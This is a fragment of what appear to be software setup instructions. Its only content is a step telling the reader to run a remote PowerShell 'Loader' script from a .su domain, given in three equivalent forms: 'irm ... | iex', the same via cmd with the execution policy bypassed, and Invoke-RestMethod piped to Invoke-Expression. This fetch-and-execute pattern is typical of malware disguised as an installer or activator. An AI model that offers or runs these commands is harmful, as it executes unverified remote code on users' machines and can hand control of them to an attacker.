...
2. **Execute the Setup Script:**
   ...
   ```powershell
   irm https://get-software.su/powershell/Loader.ps | iex
   ```
...
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://get-software.su/powershell/Loader.ps | iex"
```
...
```cmd
Invoke-RestMethod https://get-software.su/powershell/Loader.ps | Invoke-Expression
```
